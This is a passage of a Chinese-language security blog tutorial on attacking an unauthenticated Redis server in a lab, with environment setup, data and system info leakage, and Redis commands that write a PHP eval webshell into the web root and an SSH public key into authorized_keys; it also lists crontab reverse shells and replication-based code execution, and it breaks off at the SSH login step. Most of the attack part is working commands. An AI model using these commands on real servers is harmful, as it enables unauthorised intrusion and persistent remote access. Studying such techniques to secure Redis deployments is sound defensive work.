FDNHdNRE42VFRFeUxqQTFOaUF3VERRdU5qa2dNVEl1TWpJemJEY3VNelkxSURRdU16VTBJRGN1TXpZMUxUUXVNelZNTVRJdU1EVTJJREI2SWk4K1BDOXpkbWMrIi8+PHRleHQgYXJpYS1oaWRkZW49InRydWUiIHg9IjQzNSIgeT0iMTUwIiBmaWxsPSIjY2NjIiBmaWxsLW9wYWNpdHk9Ii4zIiB0cmFuc2Zvcm09InNjYWxlKC4xKSIgdGV4dExlbmd0aD0iNDEwIj5kNG0xdHM8L3RleHQ+PHRleHQgeD0iNDM1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjMzMzIiB0ZXh0TGVuZ3RoPSI0MTAiPmQ0bTF0czwvdGV4dD48dGV4dCBhcmlhLWhpZGRlbj0idHJ1ZSIgeD0iODU1IiB5PSIxNTAiIGZpbGw9IiMwMTAxMDEiIGZpbGwtb3BhY2l0eT0iLjMiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMTg8L3RleHQ+PHRleHQgeD0iODU1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjZmZmIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMTg8L3RleHQ+PC9nPjwvc3ZnPg==" width="105" height="20" class="img_ev3q"> <img decoding="async" loading="lazy" alt="d4m1ts_2019" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByb2xlPSJpbWciIGFyaWEtbGFiZWw9ImQ0bTF0czogMjAxOSI+PHRpdGxlPmQ0bTF0czogMjAxOTwvdGl0bGU+PGxpbmVhckdyYWRpZW50IGlkPSJzIiB4Mj0iMCIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2JiYiIgc3RvcC1vcGFjaXR5PSIuMSIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1vcGFjaXR5PSIuMSIvPjwvbGluZWFyR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJyIj48cmVjdCB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iI2ZmZiIvPjwvY2xpcFBhdGg+PGcgY2xpcC1wYXRoPSJ1cmwoI3IpIj48cmVjdCB3aWR0aD0iNjgiIGhlaWdodD0iMjAiIGZpbGw9IiNiZmJmYmYiLz48cmVjdCB4PSI2OCIgd2lkdGg9IjM3IiBoZWlnaHQ9IjIwIiBmaWxsPSIjZmY3NTFhIi8+PHJlY3Qgd2lkdGg9IjEwNSIgaGVpZ2h0PSIyMCIgZmlsbD0idXJsKCNzKSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMTAiPjxpbWFnZSB4PSI1IiB5PSIzIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHhsaW5rOmhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNJak0yTXpZek5rSWlCeWIyeGxQU0pwYldjaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkNBeU5DSWdlRzFzYm5NOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2YzNabklqNDhkR2wwYkdVK1JYUm9aWEpsZFcwOEwzUnBkR3hsUGp4d1lYUm9JR1E5SWsweE1TNDVORFFnTVRjdU9UZE1OQzQxT0NBeE15NDJNaUF4TVM0NU5ETWdNalJzTnk0ek55MHhNQzR6T0MwM0xqTTNNaUEwTGpNMWFDNHdNRE42VFRFeUxqQTFOaUF3VERRdU5qa2dNVEl1TWpJemJEY3VNelkxSURRdU16VTBJRGN1TXpZMUxUUXVNelZNTVRJdU1EVTJJREI2SWk4K1BDOXpkbWMrIi8+PHRleHQgYXJpYS1oaWRkZW49InRydWUiIHg9IjQzNSIgeT0iMTUwIiBmaWxsPSIjY2NjIiBmaWxsLW9wYWNpdHk9Ii4zIiB0cmFuc2Zvcm09InNjYWxlKC4xKSIgdGV4dExlbmd0aD0iNDEwIj5kNG0xdHM8L3RleHQ+PHRleHQgeD0iNDM1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjMzMzIiB0ZXh0TGVuZ3RoPSI0MTAiPmQ0bTF0czwvdGV4dD48dGV4dCBhcmlhLWhpZGRlbj0idHJ1ZSIgeD0iODU1IiB5PSIxNTAiIGZpbGw9IiMwMTAxMDEiIGZpbGwtb3BhY2l0eT0iLjMiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMTk8L3RleHQ+PHRleHQgeD0iODU1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjZmZmIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMTk8L3RleHQ+PC9nPjwvc3ZnPg==" width="105" height="20" class="img_ev3q"> <img decoding="async" loading="lazy" alt="d4m1ts_2020" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByb2xlPSJpbWciIGFyaWEtbGFiZWw9ImQ0bTF0czogMjAyMCI+PHRpdGxlPmQ0bTF0czogMjAyMDwvdGl0bGU+PGxpbmVhckdyYWRpZW50IGlkPSJzIiB4Mj0iMCIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2JiYiIgc3RvcC1vcGFjaXR5PSIuMSIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1vcGFjaXR5PSIuMSIvPjwvbGluZWFyR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJyIj48cmVjdCB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iI2ZmZiIvPjwvY2xpcFBhdGg+PGcgY2xpcC1wYXRoPSJ1cmwoI3IpIj48cmVjdCB3aWR0aD0iNjgiIGhlaWdodD0iMjAiIGZpbGw9IiNiZmJmYmYiLz48cmVjdCB4PSI2OCIgd2lkdGg9IjM3IiBoZWlnaHQ9IjIwIiBmaWxsPSIjZmY3NTFhIi8+PHJlY3Qgd2lkdGg9IjEwNSIgaGVpZ2h0PSIyMCIgZmlsbD0idXJsKCNzKSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMTAiPjxpbWFnZSB4PSI1IiB5PSIzIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHhsaW5rOmhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNJak0yTXpZek5rSWlCeWIyeGxQU0pwYldjaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkNBeU5DSWdlRzFzYm5NOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2YzNabklqNDhkR2wwYkdVK1JYUm9aWEpsZFcwOEwzUnBkR3hsUGp4d1lYUm9JR1E5SWsweE1TNDVORFFnTVRjdU9UZE1OQzQxT0NBeE15NDJNaUF4TVM0NU5ETWdNalJzTnk0ek55MHhNQzR6T0MwM0xqTTNNaUEwTGpNMWFDNHdNRE42VFRFeUxqQTFOaUF3VERRdU5qa2dNVEl1TWpJemJEY3VNelkxSURRdU16VTBJRGN1TXpZMUxUUXVNelZNTVRJdU1EVTJJREI2SWk4K1BDOXpkbWMrIi8+PHRleHQgYXJpYS1oaWRkZW49InRydWUiIHg9IjQzNSIgeT0iMTUwIiBmaWxsPSIjY2NjIiBmaWxsLW9wYWNpdHk9Ii4zIiB0cmFuc2Zvcm09InNjYWxlKC4xKSIgdGV4dExlbmd0aD0iNDEwIj5kNG0xdHM8L3RleHQ+PHRleHQgeD0iNDM1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjMzMzIiB0ZXh0TGVuZ3RoPSI0MTAiPmQ0bTF0czwvdGV4dD48dGV4dCBhcmlhLWhpZGRlbj0idHJ1ZSIgeD0iODU1IiB5PSIxNTAiIGZpbGw9IiMwMTAxMDEiIGZpbGwtb3BhY2l0eT0iLjMiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMjA8L3RleHQ+PHRleHQgeD0iODU1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjZmZmIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMjA8L3RleHQ+PC9nPjwvc3ZnPg==" width="105" height="20" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="危害">危害<a href="#危害" class="hash-link" aria-label="危害的直接链接" title="危害的直接链接">​</a></h2>
<p><strong>信息泄露</strong></p>
<ul>
<li>系统信息</li>
<li>redis保存的信息</li>
</ul>
<p><strong>写文件GetShell</strong></p>
<ul>
<li>在Web目录中写入webshell</li>
<li>写入SSH公钥直接连接</li>
<li>写入计划任务(corntab)反弹shell</li>
</ul>
<p><strong>高级利用</strong></p>
<ul>
<li>主从复制getshell（4.x version &lt; 5.0.5）</li>
<li>模块加载执行命令（&gt; 4.x）</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="环境准备">环境准备<a href="#环境准备" class="hash-link" aria-label="环境准备的直接链接" title="环境准备的直接链接">​</a></h2>
<table><thead><tr><th>🐔型</th><th>ip</th><th>服务</th><th>版本</th></tr></thead><tbody><tr><td>攻击🐔</td><td>192.168.1.100</td><td>Windows</td><td>10</td></tr><tr><td>攻击🐔</td><td>192.168.1.100</td><td>redis-cli</td><td>3.0.501</td></tr><tr><td>受害🐔</td><td>192.168.1.105</td><td>Ubuntu</td><td>16.04 LTS</td></tr><tr><td>受害🐔</td><td>192.168.1.105</td><td>redis-server</td><td>3.0.6</td></tr><tr><td>受害🐔</td><td>192.168.1.105</td><td>Apache</td><td>2.4.18 (Ubuntu)</td></tr></tbody></table>
<blockquote>
<p>因为新版的 redis 默认绑定的地址为 <code>127.0.0.1</code>，所以为了复现漏洞，我们手动将绑定端口改成<code>0.0.0.0</code></p>
</blockquote>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vim</span><span class="token plain"> redis.conf</span><br></span></code></pre></div></div>
<ul>
<li>将 <code>69</code> 行的 <code>127.0.0.1</code> 修改为 <code>0.0.0.0</code></li>
</ul>
<p><img decoding="async" loading="lazy" alt="change_bind_ip" src="/assets/images/1-b0000d39e6ecbae0b41b72c7deb667ed.png" width="725" height="409" class="img_ev3q"></p>
<ul>
<li>启动redis必须使用 root 权限启动，否则<code>save</code>时会报错</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 关闭 redis 服务</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> redis-server stop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 打开 redis 服务</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/bin/ </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> redis-server</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="信息泄露">信息泄露<a href="#信息泄露" class="hash-link" aria-label="信息泄露的直接链接" title="信息泄露的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="数据泄露">数据泄露<a href="#数据泄露" class="hash-link" aria-label="数据泄露的直接链接" title="数据泄露的直接链接">​</a></h3>
<p><strong>获取所有的key值</strong> <code>keys *</code></p>
<p>具体查看数据可以查看redis教程</p>
<blockquote>
<p><a href="http://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener noreferrer">http://www.runoob.com/redis/redis-tutorial.html</a></p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="get_keys" src="data:image/png;base64,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" width="501" height="117" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="系统信息泄露">系统信息泄露<a href="#系统信息泄露" class="hash-link" aria-label="系统信息泄露的直接链接" title="系统信息泄露的直接链接">​</a></h3>
<p><code>info</code> 命令</p>
<p>可以看到redis的版本、系统内核版本、配置文件路径等信息</p>
<p><img decoding="async" loading="lazy" alt="info" src="/assets/images/3-e2b7455b13e6206d7500323e8e1d9095.png" width="405" height="321" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="写文件getshell">写文件GetShell<a href="#写文件getshell" class="hash-link" aria-label="写文件GetShell的直接链接" title="写文件GetShell的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="在web目录中写入webshell">在Web目录中写入webshell<a href="#在web目录中写入webshell" class="hash-link" aria-label="在Web目录中写入webshell的直接链接" title="在Web目录中写入webshell的直接链接">​</a></h3>
<p><strong>前提条件</strong></p>
<p>已知网站目录的绝对路径，并且具有读写权限</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="环境搭建">环境搭建<a href="#环境搭建" class="hash-link" aria-label="环境搭建的直接链接" title="环境搭建的直接链接">​</a></h4>
<p><strong>启动apache服务器</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> apache2 start</span><br></span></code></pre></div></div>
<p><strong>查看apache服务器状态</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">service</span><span class="token plain"> apache2 status</span><br></span></code></pre></div></div>
<p>有一个 <strong>running</strong> 则说明在运行状态</p>
<p><img decoding="async" loading="lazy" alt="running" src="/assets/images/4-24287975b7e146fdc4e2fd6456cebb9b.png" width="728" height="350" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="getshell">getshell<a href="#getshell" class="hash-link" aria-label="getshell的直接链接" title="getshell的直接链接">​</a></h4>
<ul>
<li>写入shell</li>
</ul>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 写入一个string内容</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> shell </span><span class="token string" style="color:#e3116c">&quot;&lt;?php @eval(</span><span class="token string variable" style="color:#36acaa">$_POST</span><span class="token string" style="color:#e3116c">[&#x27;shell&#x27;]);?&gt;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 设置备份目录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"> /var/www/html/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 设置备份文件名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config </span><span class="token builtin class-name">set</span><span class="token plain"> dbfilename shell.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 保存文件到本地</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">save</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="config" src="/assets/images/5-a00126b58ff7829a1425e54581fff9a9.png" width="558" height="164" class="img_ev3q"></p>
<ul>
<li>菜刀连接</li>
</ul>
<p><img decoding="async" loading="lazy" alt="Cknife" src="/assets/images/6-4e7b48dba51a1d592d69b399951ba985.png" width="900" height="480" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="写入ssh公钥直接连接">写入SSH公钥直接连接<a href="#写入ssh公钥直接连接" class="hash-link" aria-label="写入SSH公钥直接连接的直接链接" title="写入SSH公钥直接连接的直接链接">​</a></h3>
<ul>
<li>本地生成公钥和私钥</li>
<li>将公钥写入到目标的<code>.ssh</code>文件夹</li>
<li>ssh 连接</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="在本地生成公钥和私钥">在本地生成公钥和私钥<a href="#在本地生成公钥和私钥" class="hash-link" aria-label="在本地生成公钥和私钥的直接链接" title="在本地生成公钥和私钥的直接链接">​</a></h4>
<p>PS : 这里为了方便，我直接从受害🐔里面生成的公钥和私钥，然后再将他们剪切到攻击🐔</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh-keygen </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> rsa</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="generate_ssh" src="/assets/images/7-04101af81c103ef5127923de80ef3f5f.png" width="589" height="341" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="cat_key" src="/assets/images/8-e9a0cb03c586cd9ae49cc7325a31804d.png" width="727" height="110" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="将公钥写入文件中">将公钥写入文件中<a href="#将公钥写入文件中" class="hash-link" aria-label="将公钥写入文件中的直接链接" title="将公钥写入文件中的直接链接">​</a></h4>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 备份文件目录设置为对应的 .ssh，部分为 /root/.ssh/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config set dir /home/lynn/.ssh/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">config set dbfilename authorized_keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set key &quot;\n\n\生成的公钥n\n&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">save</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="cat_key" src="/assets/images/9-cc63d6c7d5cd2166fe9f999a04d4a4b5.png" width="976" height="340" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ssh-连接">ssh 连接<a href="#ssh-连接" class="hash-link" aria-label="ssh 连接的直接链接" title="ssh 连接的直接链接">​</a></h4>
